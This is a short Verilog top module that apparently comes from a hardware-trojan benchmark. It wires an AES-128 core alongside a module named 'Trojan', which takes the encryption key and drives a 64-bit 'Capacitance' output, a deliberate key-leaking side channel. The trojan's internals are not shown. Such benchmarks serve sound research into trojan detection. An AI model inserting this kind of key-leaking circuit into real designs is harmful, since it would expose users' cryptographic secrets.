`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    12:02:52 03/06/2013 
// Design Name: 
// Module Name:    top 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module top_aes_128_T100(
    input clk,
    input rst,
    input [127:0] state,
    input [127:0] key,
    output [127:0] cipher,
	 output [63:0] Capacitance
    );

	aes_128_T100 AES  (clk, state, key, cipher); 
	TSC_T100 Trojan (rst, clk, key, Capacitance); 

endmodule
